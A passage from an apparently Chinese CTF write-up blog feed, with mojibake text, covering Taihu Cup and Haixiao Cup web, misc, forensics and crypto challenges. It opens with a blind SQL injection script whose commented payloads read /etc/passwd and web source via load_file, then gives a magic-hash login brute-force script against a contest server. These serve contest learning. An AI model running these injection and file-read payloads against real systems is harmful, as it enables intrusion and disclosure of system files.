class="string">&quot;if(ascii(substr(&quot;</span>+pay+<span class="string">&quot;,%d,1))&gt;%d,1,0)%%23&quot;</span>%(i,mid)</span><br><span class="line">			<span class="comment"># print(url+payload)</span></span><br><span class="line">			response = requests.get(url+payload)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;upload&quot;</span> <span class="keyword">in</span> response.text :</span><br><span class="line">				low = mid + <span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				high = mid</span><br><span class="line"></span><br><span class="line">			mid = (low + high) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">		result += chr(int(mid))</span><br><span class="line">		print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pay = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;database:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br><span class="line"><span class="comment"># pay = &#x27;(union select load_file(0x2f6574632f706173737764))&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;/etc/passwd:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br><span class="line"><span class="comment"># pay = &#x27;(union select load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;/var/www/html/index.php:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br><span class="line"><span class="comment"># pay = &#x27;(union select load_file(0x2f7461722e7079))&#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;/tar.py:&#x27;)</span></span><br><span class="line"><span class="comment"># print(exp(pay))</span></span><br></pre></td></tr></table></figure>

<h3 id="ezMd5"><a href="#ezMd5" class="headerlink" title="ezMd5"></a>ezMd5</h3><p>é¦–å…ˆF12ä¹‹åçœ‹åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;åå®«ç®¡ç†ç³»ç»Ÿç™»å½•&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form name=<span class="string">&quot;login&quot;</span> action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;p&gt;ç”¨æˆ·å&lt;input type=text name=<span class="string">&quot;name&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;å¯† ç &lt;input type=password name=<span class="string">&quot;password&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ç™»å½•&quot;</span>&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"> &lt;!-- </span><br><span class="line">$result = @auth($username,$password);</span><br><span class="line"><span class="keyword">if</span> (md5($username) == md5($result)  <span class="keyword">and</span> $result !== $username)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;bingo : &lt;b&gt;<span class="subst">$flag</span>&lt;/b&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>å…³é”®æç¤ºå¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = @auth($username,$password);</span><br><span class="line"><span class="keyword">if</span> (md5($username) == md5($result)  <span class="keyword">and</span> $result !== $username)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;bingo : &lt;b&gt;<span class="subst">$flag</span>&lt;/b&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªè¦ç¬¦åˆè¿™ä¸ª<code>if</code>çš„æ¡ä»¶å°±å¯ä»¥æ‰“å°å‡ºflagäº†</p>
<p>è¿™é‡Œå¯ä»¥ç»™usernameèµ‹å€¼ä¸€ä¸ªæ•°å€¼md5åŠ å¯†åæ˜¯0eå¼€å¤´çš„ï¼Œç„¶åå»çˆ†ç ´passwordçš„å€¼ï¼Œä½¿å¾—resultçš„MD5å€¼å’Œusernameçš„MD5ç›¸ç­‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://122.112.253.121:10032/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    password = <span class="string">&#x27;b&#x27;</span> * i + <span class="string">&#x27;QNKCDZO&#x27;</span></span><br><span class="line">    payload = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;240610708&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: password&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.request(<span class="string">&quot;POST&quot;</span>, url, data=payload)</span><br><span class="line">    <span class="keyword">if</span> response.text.find(<span class="string">&#x27;flag&#123;&#x27;</span>) != <span class="number">-1</span>:</span><br><span class="line">        print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114122758555.png" alt="image-20201114122758555"></p>
<p>è™½ç„¶å¯ä»¥ç”¨è¿™ç§æ–¹æ³•åšï¼Œä½†æ˜¯æ„Ÿè§‰å¯èƒ½æ˜¯éé¢„æœŸï¼Œä½†æ˜¯æœ¬æ¬¡æ¯”èµ›æˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°webçš„å®˜æ–¹wpï¼Œä¹Ÿå°±ä¸çŸ¥é“é¢„æœŸè§£æ˜¯ä»€ä¹ˆäº†ã€‚</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><p>hintï¼šå¸Œå°”å¯†ç -&gt;rabbit</p>
<p>é¦–å…ˆé¢˜ç›®ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼š715e25aec2a24ac79ab6e74497cafb80.zip</p>
<p>ç›´æ¥è§£å‹çš„è¯ä¼šæŠ¥é”™æ–‡ä»¶æŸåï¼Œæ‹‰è¿›010ç¼–è¾‘å™¨å‘ç°ä¼ªåŠ å¯†ï¼ŒæŠŠè¿™ä¸ªåœ°æ–¹ç”±09æ”¹ä¸º00</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165116000.png" alt="image-20201114165116000"></p>
<p>ç„¶åå†è§£å‹å‘ç°è§£å‹å‡ºä¸¤ä¸ªæ–‡ä»¶åˆ†åˆ«ä¸ºï¼š<code>fun.zip</code>ï¼Œ<code>omisc.docx</code></p>
<p>æ‰“å¼€<code>omisc.docx</code></p>
<p>ä¸€èˆ¬æ¥è¯´wordæ–‡æ¡£å…ˆè€ƒè™‘ä¸‹æœ‰æ²¡æœ‰éšè—æ–‡å­—ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨é€‰é¡¹ä¸­æŠŠéšè—æ–‡å­—æ‰“å¼€</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165628922.png" alt="image-20201114165628922"></p>
<p>ç„¶åå‘ç°å¤šäº†å¦‚ä¸‹ä¸¤è¡Œ</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165716474.png" alt="image-20201114165716474"></p>
<p>å‘ç°æ˜¯å¸Œå°”åŠ å¯†ï¼Œåœ¨çº¿å¸Œå°”åŠ å¯†åœ°å€ï¼š<a href="http://www.atoolbox.net/Tool.php?Id=914">http://www.atoolbox.net/Tool.php?Id=914</a></p>
<p>è§£å¯†åå‘ç°å¾—åˆ°love and peaceee</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114165904666.png" alt="image-20201114165904666"></p>
<p>ç„¶åå†ç”¨rabbitè§£å¯†ä¸Šé¢é‚£ä¸€å¤§æ®µï¼Œå¯†é’¥ä¸ºlove and peaceee</p>
<p>åœ¨çº¿rabbitè§£å¯†åœ°å€ï¼š<a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114170253089.png" alt="image-20201114170253089"></p>
<p>ç„¶åä¸¢è¿›CyberChefï¼Œç‚¹å‡»å°é­”æ³•æ£’ï¼Œè‡ªåŠ¨è¯†åˆ«base32</p>
<p>CyberChefåœ°å€ï¼š<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114170704683.png" alt="image-20201114170704683"></p>
<p>ç„¶åå°±æ˜¯å¾ˆæ˜æ˜¾çš„Unicodeç¼–ç ï¼Œæ‰¾ä¸ªåœ¨çº¿è§£å¯†çš„è¯•è¯•çœ‹</p>
<p>åœ¨çº¿è§£å¯†Unicodeåœ°å€ï¼š<a href="http://tool.chinaz.com/tools/unicode.aspx">http://tool.chinaz.com/tools/unicode.aspx</a></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114170852479.png" alt="image-20201114170852479"></p>
<p>ç†Ÿæ‚‰çš„ä½›æ›°åŠ å¯†ï¼Œåœ¨çº¿è§£å¯†åœ°å€ï¼š<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114172118786.png" alt="image-20201114172118786"></p>
<p>ç„¶åç”¨è§£å¯†çš„å†…å®¹ä½œä¸ºå¯†ç è§£å‹<code>fun.zip</code>ï¼Œè§£å‹åå¾—åˆ°fun.wavï¼Œæ‹–è¿›<code>Audicty</code>ä¹‹å</p>
<p>æ‰“å¼€é¢‘è°±å›¾å³å¯å¾—åˆ°flag</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114180815728.png" alt="image-20201114180815728"></p>
<h3 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h3><p>hintï¼šé—®windowsåŠ¨æ€é“¾æ¥åº“ç®¡å®¶å§ï¼Œä»–ä¼šå‘Šè¯‰ä½ answer</p>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªå¤§å°å·®ä¸å¤šæ˜¯1Gçš„åä¸ºdumpçš„æ–‡ä»¶ï¼Œè€ctferä¸€çœ‹å°±çŸ¥é“æ˜¯å†…å­˜å–è¯äº†</p>
<p>é¦–å…ˆæ¢æµ‹ç³»ç»Ÿç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f dump imageinfo</span><br></pre></td></tr></table></figure>

<p>æœ€åå‘ç°æ¢æµ‹å›¾ç‰‡æœ‰ä¸€äº›ä¿¡æ¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f dump --profile&#x3D;Win7SP0x86 filescan | grep -E &#39;jpg|png|jpeg|bmp|gif&#39;</span><br></pre></td></tr></table></figure>

<p>ç„¶ådumpä¸‹æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f dump --profile&#x3D;Win7SP0x86 dumpfiles -Q 0x000000003fdf6118 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114201513903.png" alt="image-20201114201513903"></p>
<p>æ‰“å¼€å³å¯å‘ç°flag</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E5%A4%AA%E6%B9%96%E6%9D%AF/image-20201114201746390.png" alt="image-20201114201746390"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>ç¬¬ä¸‰å±Šæµ·å•¸æ¯</title>
    <url>/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AF/</url>
    <content><![CDATA[<p>è®°ä¸€æ¬¡å¹¿èˆªæ ¡å†…çš„æ¯”èµ›ï¼Œæœ¬æ¬¡ä½œä¸ºå‡ºé¢˜äººï¼Œè™½ç„¶åªå‡ºäº†ä¸€é“é¢˜<a id="more"></a></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="è¡¨ç™½"><a href="#è¡¨ç™½" class="headerlink" title="è¡¨ç™½"></a>è¡¨ç™½</h3><p>PNGé«˜åº¦éšè—</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119115739801.png" alt="image-20201119115739801"></p>
<h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>åŸºäº LSB åŸç†å›¾ç‰‡éšå†™</p>
<p>ä½¿ç”¨ Stegsolve çš„ Data Extract åˆ†æï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://share.weiyun.com/z9PBJjks">https://share.weiyun.com/z9PBJjks</a></p>
<p>åŠ è½½å›¾ç‰‡ï¼Œå¹¶ Data Extract åˆ†æ</p>
<p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-YQrNMwiLAMKiXyXK.png"></p>
<p>è¿™é‡Œå°±åˆ†æå‡ºæ¥ä¸€ä¸ª png çš„æ–‡ä»¶ã€‚ç‚¹å‡»ä¸‹æ–¹ save bin ä¿å­˜ä¸º png æ–‡ä»¶å³å¯ã€‚</p>
<p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-qV653B9sifbnxjyQ.png"></p>
<p>æ‰«æäºŒç»´ç å³å¯è·å¾—flagã€‚</p>
<h3 id="è€çƒŸæª"><a href="#è€çƒŸæª" class="headerlink" title="è€çƒŸæª"></a>è€çƒŸæª</h3><p>ç›´æ¥ä¸¢kaliï¼Œbinwalkåˆ†ç¦»</p>
<p>æœ€åå¾—åˆ°ä¸€ä¸ªå€’è¿‡æ¥çš„flagï¼Œå°†å…¶é¢ å€’å¾—åˆ°æ­£ç¡®çš„flag</p>
<h3 id="ä½ èƒ½ç ´è§£å—"><a href="#ä½ èƒ½ç ´è§£å—" class="headerlink" title="ä½ èƒ½ç ´è§£å—"></a>ä½ èƒ½ç ´è§£å—</h3><ul>
<li>hintï¼šå‹ç¼©åŒ…å¯†ç ä¸ºg2mtuåŠ å››ä½æ•°å­—</li>
</ul>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨ARCHPRå‹ç¼©åŒ…ç ´è§£è½¯ä»¶</p>
<p>é¦–å…ˆç”¨éå†æ‰€æœ‰çš„å¯†ç ï¼Œç„¶åä¿å­˜åœ¨1.txtå­—å…¸é‡Œé¢</p>
<p>éå†è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; open(&#39;1.txt&#39;,&#39;w&#39;)</span><br><span class="line">for i in range(1000,9999):</span><br><span class="line">	a &#x3D; &#39;g2mtu&#39;+str(i)+&#39;\n&#39;</span><br><span class="line">	f.write(a)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰“å¼€è½¯ä»¶é€‰æ‹©å­—å…¸æ¨¡å¼</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120006028.png" alt="image-20201119120006028"></p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120028376.png" alt="image-20201119120028376"></p>
<p>è§£å¼€å‹ç¼©åŒ…å†base64è§£å¯†å³å¯è·å¾—flagã€‚</p>
<h3 id="disk0"><a href="#disk0" class="headerlink" title="disk0"></a>disk0</h3><p>æŒ‚è½½å‘½ä»¤å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount disk0 å­˜æ”¾çš„æ–‡ä»¶å¤¹</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120750180.png" alt="image-20201119120750180"></p>
<p>ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå’Œä¸€ä¸ªåŠ å¯†è¿‡çš„zipï¼Œæ–‡æœ¬è¯´å¯†ç è¢«åˆ é™¤äº†ï¼Œä½¿ç”¨å–è¯å·¥å…·<strong>extundelete</strong>æ¢å¤ä¸€ä¸‹disk0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete disk0 --restore-all</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120947921.png" alt="image-20201119120947921"></p>
<p>å¾—åˆ°ä¸€ä¸ªRECOVERED_FILESæ–‡ä»¶å¤¹ï¼Œé‡Œé¢fileæ–‡ä»¶å°±æ˜¯zipçš„å¯†ç </p>
<p>è§£å‹å†ä¿®æ”¹ä¸€ä¸‹å›¾ç‰‡é«˜åº¦å³å¯å¾—åˆ°flag</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="å‡¯æ’’å°†å†›"><a href="#å‡¯æ’’å°†å†›" class="headerlink" title="å‡¯æ’’å°†å†›"></a>å‡¯æ’’å°†å†›</h3><p>å‡¯æ’’å¯†ç </p>
<p>åŠ å¯†ç®—æ³•ï¼šå°†ç»™å®šçš„flagä¸­çš„æ¯ä¸ªå­—ç¬¦åç§»3ä½ï¼Œå¹¶å°†åç§»åçš„å­—ç¬¦ä¸²base64ç¼–ç </p>
<p>åŠ å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;flag&#123;crypto_is_hxb_so_eAsy0&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">result = flag.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line">encode_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    encode_flag += chr((ord(i)+<span class="number">3</span>)%<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> encode_flag</span><br></pre></td></tr></table></figure>

<p>è§£å¯†è„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result=<span class="string">&quot;]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    flag += chr(ord(i)<span class="number">-3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag.decode(<span class="string">&quot;base64&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="å°æ˜å®¶çš„å°èœå›­"><a href="#å°æ˜å®¶çš„å°èœå›­" class="headerlink" title="å°æ˜å®¶çš„å°èœå›­"></a>å°æ˜å®¶çš„å°èœå›­</h3><p>æ …æ å¯†ç </p>
<p>ç”±äºæ …æ æ•°è¾ƒå°ï¼Œå› æ­¤ä¸ç»™å‡ºæ …æ æ•°æç¤ºï¼Œå¯ä»¥ç”¨ç½‘ä¸Šçš„æ …æ å¯†ç è§£å¯†æˆ–æ‰‹å†™è„šæœ¬çˆ†ç ´æ …æ æ•°è§£å¯†</p>
<p>åŠ å¯†è„šæœ¬:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag &#x3D; &quot;flag&#123;yo_uget_itzha_lan_good&#125;&quot;</span><br><span class="line"></span><br><span class="line">#flag&#123;yo _uget_i tzha_la n_good&#125;</span><br><span class="line"></span><br><span class="line">k &#x3D; 7 </span><br><span class="line"></span><br><span class="line">flag &#123;yo_ uget _itz ha_l an_g ood&#125;</span><br><span class="line"></span><br><span class="line">f_tn</span><br><span class="line"></span><br><span class="line">encode_flag&#x3D;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    for j in range(4):</span><br><span class="line">        encode_flag +&#x3D; flag[j*7+i]</span><br><span class="line"></span><br><span class="line">print encode_flag</span><br></pre></td></tr></table></figure>

<p>â€‹    è§£å¯†è„šæœ¬:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">encode_flag &#x3D; &quot;f_tnluz_aghggeao&#123;t_oy_ldoia&#125;&quot;</span><br><span class="line"></span><br><span class="line">for k in range(1,29):</span><br><span class="line">    flag&#x3D;&quot;&quot;</span><br><span class="line">    num &#x3D; 28&#x2F;k</span><br><span class="line">    for i in range(k):</span><br><span class="line">	    for j in range(num):</span><br><span class="line">		    flag +&#x3D; encode_flag[j*k+i]</span><br><span class="line">    if &quot;flag&quot; in flag:</span><br><span class="line">        print &quot;k:&quot;+str(28&#x2F;k)+&quot;\n&quot;+&quot;flag:\n&quot;+flag+&quot;\n&quot;</span><br></pre></td></tr></table></figure>

<h3 id="æˆ˜æŠ¥"><a href="#æˆ˜æŠ¥" class="headerlink" title="æˆ˜æŠ¥"></a>æˆ˜æŠ¥</h3><p>æè¿°ï¼š</p>
<p>æˆ‘å†›æˆåŠŸæ£æ¯æ•Œå†›ç§˜å¯†ç”µå°ç¼´è·å¯†æ–‡å’Œæ˜æ–‡ä¸€ä»½ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä»½å¯†æ–‡éš¾ä»¥ç ´è§£ç‰¹è¯·ä½ æ¥ç ´è¯‘å¯†ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¯†æ–‡ï¼š</span><br><span class="line">jivsyisgmlirgbggvuocevsivnsoevszotfloymivnmozwgitmbyfevtgugvffecgmflgtglimbggvjgmmuocevsivnijofcotgsoevsklgvflgkotjnkimmfejjhohyjifgnbwlyvfgtsiflgtgtmmcijjfeslfjwqvefstoyhmngrgjohgnflgetokvhiffgtvmozmhggulevnghgvngvfozgiuloflgtmocgjivsyisggdhgtfmbgjegrgflifwgitmisoklgvflgkotjnlinxymfzergfofgvcejjeovhgohjgflgwmhoqghgtlihmjivsyisgmbgfkggvflgcmoovizfgtkitnmcivwozflomghgohjgmfitfgnmgffjevsnokvfobguocgzitcgtmivnflgetjivsyisgmfoobguicgcotgmgffjgnivnzgkgtevvycbgtevtgugvfugvfytegmftingevnymfteijemifeovflgngrgjohcgvfozflgvifeovmfifgivnflgmhtginozyvergtmijuochyjmotwgnyuifeovgmhgueijjwsjobijemifeovivnbgffgtuoccyveuifeovmevflghimfzgknguingmijjlirguiymgncivwjivsyisgmfonemihhgitivnnocevivfjivsyisgmmyulimgvsjemlmhivemlivnulevgmgitgevutgimevsjwfiqevsorgtifhtgmgvfflgkotjnlimiboyfjivsyisgmflgnemftebyfeovozflgmgjivsyisgmemlysgjwyvgrgvflgsgvgtijtyjgemflifcejnpovgmlirgtgjifergjwzgkjivsyisgmozfgvmhoqgvbwcivwhgohjgklejglofkgfpovgmlirgjofmozfgvmhoqgvbwmcijjvycbgtmgytohglimovjwitoyvnjivsyisgmflgicgteuimiboyfizteuiivnimeiivnflghiuezeuhgtlihmozkleulhihyivgksyevgiijovgiuuoyvfmzotkgjjorgtflgcgneivvycbgtozmhgiqgtmemcgtgkleulfliflijzflgkotjnmjivsyisgmitgmhoqgvbwzgkgthgohjgflivflifijtginwkgjjorgtozflgfofijozjivsyisgmitgujomgfogdfevufeovkeflovjwizgkgjngtjwmhgiqgtmjgzfheuqiftivnocbymyyevuicgtoovgeslftgcievevsmhgiqgtmuleihivguoevcgdeuojehivihiulgevflgyvefgnmfifgmfkootfltggotkinxesyeviymftijeiovgkefliaygmfeovcitqvovgozflgmgmggcmfolirgcyululivugozmytrerij</span><br><span class="line">æ˜æ–‡ï¼š</span><br><span class="line">Languages have been coming and going for thousands of years, but in recent times there has been less coming and a lot more going. When the world was still populated by hunter-gatherersï¼Œsmallï¼Œtightly knit(è”ç³»)groups developed their own patterns of speech independent of each other. Some language experts believe that 10,000 years ago, when the world had just five to ten million people, they spoke perhaps 12, 000 languages between them.Soon afterwards, many of those people started settling down to become farmers, and their languages too became more settled and fewer in number. In recent centuries, trade, industrialisation, the development of the nation-state and the spread of universal compulsory education, especially globalisation and better communications in the past few decades, all have caused many languages to disappear, and dominant languages such as Englishï¼ŒSpanish and Chinese are increasingly taking over.At present, the world has about 6, 800 languages. The distribution of these languages is hugely uneven. The general rule is that mild zones have relatively few languages, often spoken by many people, while hot wet zones have lots, often spoken by small numbers. Europe has only around 200 languages; the Americas about 1, 000; Africa 2, 400; and Asia and the Pacific perhaps 3,200, of which Papua New Guinea alone accounts for well over 800.The median number(ä¸­ä½æ•°) of speakers is mere 6,000, which that half the world&#39;s languages are spoken by fewer people than that.Already well over 400 of the total of 6, 800 languages are close to extinction (æ¶ˆäº¡), with only a few elderly speakers left. Pick, at random, Busuu in Cameroon ï¼ˆeight remaining speakers), Chiapaneco in Mexico (150), Lipan Apache in the United States (two or three) or Wadjigu in Australia (one, with a question-mark): none of these seems to have much chance of survival</span><br></pre></td></tr></table></figure>

<p>å¾…è§£å¯†æ–‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">givfome</span><br></pre></td></tr></table></figure>

<p>è§£é¢˜è¿‡ç¨‹</p>
<p>è¿›è¡Œå­—é¢‘ç»Ÿè®¡å¾—å‡ºå¦‚ä¸‹ç»“æœ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e &#x3D;&gt;g</span><br><span class="line">a &#x3D;&gt;i</span><br><span class="line">n &#x3D;&gt;v</span><br><span class="line">t &#x3D;&gt;f</span><br><span class="line">o &#x3D;&gt;o</span><br><span class="line">s &#x3D;&gt;m</span><br><span class="line">i &#x3D;&gt;e</span><br><span class="line">r &#x3D;&gt;j</span><br><span class="line">l &#x3D;&gt;t</span><br><span class="line">h &#x3D;&gt;l</span><br><span class="line">u &#x3D;&gt;y</span><br><span class="line">d &#x3D;&gt;s</span><br><span class="line">g &#x3D;&gt;h</span><br><span class="line">p &#x3D;&gt;n</span><br><span class="line">c &#x3D;&gt;u</span><br><span class="line">m &#x3D;&gt;c</span><br><span class="line">f &#x3D;&gt;z</span><br><span class="line">w &#x3D;&gt;k</span><br><span class="line">y &#x3D;&gt;b</span><br><span class="line">v &#x3D;&gt;w</span><br><span class="line">k &#x3D;&gt;r</span><br><span class="line">c &#x3D;&gt;q</span><br><span class="line">p &#x3D;&gt;d</span><br><span class="line">t &#x3D;&gt;p</span><br><span class="line">x &#x3D;&gt;x</span><br><span class="line">j &#x3D;a</span><br></pre></td></tr></table></figure>

<ul>
<li>åŠ å¯†è„šæœ¬</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = [<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">s = <span class="string">&quot;eantosi&quot;</span></span><br><span class="line">m = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	k=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">		i = i.lower()</span><br><span class="line">		<span class="keyword">if</span> j == i:</span><br><span class="line">			l =(<span class="number">19</span>*k+<span class="number">18</span>)%<span class="number">26</span>	</span><br><span class="line">			m = m + table[l]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			k = k+<span class="number">1</span>	</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>flag</p>
